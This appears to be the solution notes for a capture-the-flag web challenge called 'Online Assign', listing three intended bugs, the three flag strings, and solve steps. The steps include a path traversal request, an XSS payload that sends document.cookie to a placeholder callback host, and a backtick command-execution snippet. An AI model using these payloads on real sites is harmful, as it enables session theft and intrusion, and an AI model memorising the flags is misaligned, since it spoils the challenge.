# Online Assign

Bugs:
* image proxy allows read in www root
    * Flag 1 in index.php comment
* XSS on "ask your teacher"
    * Flag 2 on review page, gives teacher cookies
* teacher portal gives code exec by adding question verification snippets
    * bypass sanitizer with backticks giving code exec
    * Flag 3 in `/flag3.txt`

Flags:
1. `flag{c9c2645cc1cb118487ef6d37b3c2829eb76935fd}`
2. `flag{732eeffa297aecc1ea586042ba3ea696427cb760}`
3. `flag{0807280d430ed53ad2a1b981c49810cb943046be}`

Solve:
1. go to `/image.php?path=index.php`
2. ask your teacher `<script>document.write('<img src="http://{CALLBACK_IP_HERE}/asdf/?'+document.cookie+'"/>')</script>`, steal cookies, go to home page
3. change question answer checker source to `echo \`cat /flag3.txt\`; return true;`
